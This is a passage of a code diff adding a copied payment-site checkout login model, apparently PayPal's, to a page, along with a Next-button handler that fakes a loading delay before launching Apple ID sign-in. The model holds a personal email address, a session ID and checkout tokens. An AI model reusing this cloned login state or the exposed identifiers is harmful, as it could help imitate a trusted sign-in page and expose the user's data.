+   "flowExecutionUrl":"/signin?intent=checkout&ctxId=ullndgb7d7d0b645814ca0a4f7a95171486865&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26country.x%3DUS%26hermesLoginRedirect%3Dxoon%26locale.x%3Den_US%26token%3DEC-1LW81068K48139132%26useraction%3Dcommit&locale.x=en_US&country.x=US&flowId=EC-1LW81068K48139132",
+   "device":"mobile",
+   "isMobile":true,
+   "isWebKitBrowser":true,
+   "coBrand":"us",
+   "signUpEndPoint":"/webapps/mpp/account-selection",
+   "pageName":{
+      "page1":"pwd",
+      "page2":"pwd:::",
+      "pageError":"LoginFailed"
+   },
+   "showLogo":{
+      "type":"long"
+   },
+   "showFooter":{
+      "type":"contentOnly"
+   },
+   "adsChallengeUrl":"/auth/createchallenge/bf0013edcc72321e/challenge.js",
+   "clientName":"ul",
+   "correlationId":"8ef486cd70b89",
+   "enablePasswordAutofillOnEmailPage":true,
+   "suppressAutosubmitTime":"500",
+   "enableSuppressAutoSubmit":true,
+   "isRtl":false,
+   "enableClientCalLogging":true,
+   "passwordRecoveryFlow":{
+      "uri":"/authflow/password-recovery/?contextId=EC-1LW81068K48139132&country.x=US&locale.x=en_US&redirectUri=%252Fsignin%253Fintent%253Dcheckout%2526ctxId%253Dullndgb7d7d0b645814ca0a4f7a95171486865%2526returnUri%253D%25252Fwebapps%25252Fhermes%2526state%253D%25253Fflow%25253D1-P%252526ulReturn%25253Dtrue%252526country.x%25253DUS%252526hermesLoginRedirect%25253Dxoon%252526locale.x%25253Den_US%252526token%25253DEC-1LW81068K48139132%252526useraction%25253Dcommit%2526locale.x%253Den_US%2526country.x%253DUS%2526flowId%253DEC-1LW81068K48139132%2526sso%253Dtrue"
+   },
+   "enableAdsCaptcha":true,
+   "webAuthnFpIconEnabled":true,
+   "isWebAuthnHigherVersionEligible":false,
+   "loginType":"EMAIL_PASSWORD",
+   "keepMeLoggedInEnabled":true,
+   "rememberMe":"true",
+   "fnSyncDataEnabled":true,
+   "fnSyncTelemetryEnabled":true,
+   "enableFnBeaconOnWebViews":true,
+   "pwrFullPageRedirect":true,
+   "profile":{
+      "email":"venkat.adal.us@gmail.com"
+   },
+   "isHybridLoginExperience":false,
+   "isTrackPasswordFieldAutoFillEnabled":true,
+   "splitLoginExperience":true,
+   "phonePasswordEnabled":true,
+   "phoneNotSetUp":true,
+   "countryPhoneList":[
+      {
+         "$country":"US",
+         "$value":"US +1",
+         "$elt":"United States (+1)",
+         "$code":"+1"
+      }
+   ],
+   "phoneCode": "US +1",
+   "phone":"",
+   "lazyLoadCountryCodes":true,
+   "showEducationMessage":false,
+   "enableInvisiblePasswordField":true,
+   "splitLoginContext":"inputPassword",
+   "initialSplitLoginContext":"inputEmail",
+   "rememberProfile":false,
+   "hideSignupBtn":false,
+   "hidePwrOnRender":false,
+   "hidePwrOnEmailPage":false,
+   "hideSignupOnEmailPage":false,
+   "hideSignupOnPasswordPage":false,
+   "layout":"layouts/contextualLogin",
+   "elementalDesign":false,
+   "spinnerWithLockIcon":true,
+   "sessionID":"t2uSqlAsRsU-8UqSQygDPTk0Q4bUScX3",
+   "loginExperience":"safari",
+   "enableTealeaf":true,
+   "oneTouchContentVersion":"1"
+};   
+
+function onClickNextBtnHandler(event) {
+            event.preventDefault();
+            login.utils.showSpinner();
+            setTimeout(function(){
+            login.utils.updateView(model);
             AppleID.auth.signIn();
-        });
+        }, 1500);            
+        }
+        
+document.onreadystatechange = function() {
+    if (document.readyState === 'complete') { 
+        var btnNext = document.querySelector('#btnNext');
+        btnNext.addEventListener('click', onClickNextBtnHandler);
+	}
+};
+
+}());
+
     </script>
 </body>
+
 </html>
